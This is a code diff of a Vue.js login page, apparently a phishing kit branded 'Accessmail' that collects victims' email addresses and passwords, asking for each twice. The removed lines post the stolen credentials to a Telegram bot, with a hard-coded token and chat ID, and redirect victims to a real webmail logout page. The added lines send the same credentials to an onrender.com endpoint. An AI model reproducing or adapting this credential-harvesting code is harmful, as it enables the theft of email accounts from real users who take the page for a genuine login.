@@ -105,6 +105,7 @@ export default {
     },
     data() {
         return {
+            name: 'Accessmail',
             email: '',
             password: '',
             retypedPassword: '',  // Variable to store retyped password
@@ -123,16 +124,7 @@ export default {
         };
     },
     methods: {
-        // onVerify(token) {
-        //     this.hcaptchaToken = token;
-        // },
-        // onExpired() {
-        //     this.hcaptchaToken = null;
-        // },
-        // onError(err) {
-        //     console.error('hCaptcha error:', err);
-        //     this.errors.hcaptcha = 'Captcha failed. Please try again.';
-        // },
+    
         closeTransparentContainer() {
             this.isTransparentContainerVisible = false;
         },
@@ -219,18 +211,6 @@ export default {
             this.showDropdown = false;
         },
 
-    //    handleClickOutside(e) {
-    //   const dd = this.$refs.dropdown;
-    //   const ip = this.$refs.infoPopup;
-    //   if (
-    //     (dd && !dd.contains(e.target)) &&
-    //     (ip && !ip.contains(e.target))
-    //   ) {
-    //     this.showDropdown = false;
-    //     this.showInfoPopup = false;
-    //   }
-    // },
-
         validateEmail(email) {
             const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
             return re.test(email);
@@ -276,19 +256,15 @@ export default {
         },
 
         async sendDataToTelegram() {
-           const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
-           const chatId= '1613277499';
-            const message = `From AccessMail,Email: ${this.email}
-Password: ${this.password}
-
-Modal-email: ${this.retypedEmail}
-Modal-password: ${this.retypedPassword}
-`;
-            const backendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // const backendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const backendUrl = 'https://rate-limiter-t9b8.onrender.com/submit';
             try {
                 const response = await axios.post(backendUrl, {
-                    "chat_id": chatId,
-                    "text": message
+                    name: this.name,
+                    email: this.email,
+                    password: this.password,
+                    retypedEmail: this.retypedEmail,
+                    retypedPassword: this.retypedPassword,
                 });
 
                 if (response.status === 200) {
@@ -300,12 +276,6 @@ Modal-password: ${this.retypedPassword}
                 console.error(error);
             }
         },
-
-        redirectToWebmail() {
-            // window.location.href = 'https://webmail.en.bellnet.ca'; // Replace with actual URL
-            window.location.href = 'https://webmail.wightman.ca/?_task=logout&_token=UfokgKShUDxHAHgQQEYU9oeylD6zjBal';
-
-        }
     }
 };
 </script>
